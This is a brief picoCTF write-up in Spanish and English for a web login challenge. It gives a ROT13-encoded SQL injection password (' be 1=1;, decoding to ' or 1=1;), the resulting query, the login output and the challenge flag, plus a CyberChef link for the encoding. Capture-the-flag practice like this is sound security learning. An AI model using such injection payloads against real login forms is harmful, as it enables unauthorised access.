## Objetivo
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/29132/` ([link](https://jupiter.challenges.picoctf.org/problem/29132/)) or http://jupiter.challenges.picoctf.org:29132. Try to see if you can login as admin!
## Solución
```
password: ' be 1=1;
SQL query: SELECT * FROM admin where password = '' or 1=1;'

# Logged in!

Your flag is: picoCTF{3v3n_m0r3_SQL_06a9db19}
```
## Notas adicionales
Podemos hacer una encriptación inversa cuando los passwords la tienen para inyectar sql
## Referencias
https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,13)ROT13(true,true,false,13/disabled)&input=JyBvciAxPTE7